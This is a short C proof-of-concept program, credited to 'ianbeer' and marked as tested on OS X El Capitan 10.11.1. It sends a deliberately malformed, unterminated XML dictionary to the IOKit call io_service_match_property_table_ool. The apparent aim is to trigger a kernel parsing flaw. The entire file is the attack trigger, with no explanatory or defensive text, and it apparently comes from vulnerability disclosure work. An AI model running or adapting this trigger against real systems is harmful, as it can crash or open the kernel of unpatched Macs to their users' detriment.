// ianbeer

/*
Tested on El Capitan 10.11.1 15b42 on MacBookAir 5,2
*/ 

#include <stdio.h>
#include <stdlib.h>

#include <mach/mach.h>
#include <unistd.h>

#include <IOKit/IOKitLib.h>
#include "iokit.h"


int main(int argc, char** argv) {
  mach_port_t master = MACH_PORT_NULL;
  IOMasterPort(MACH_PORT_NULL, &master);
  printf("master port: %x\n", master);

  char* bad_dict = "<dict><key>a</key><data format=\"hex\">41414141</data>";

  io_iterator_t i;
  kern_return_t another_error;
  io_service_match_property_table_ool(master, bad_dict, strlen(bad_dict)+1, &another_error, &i);
  return 0;
}
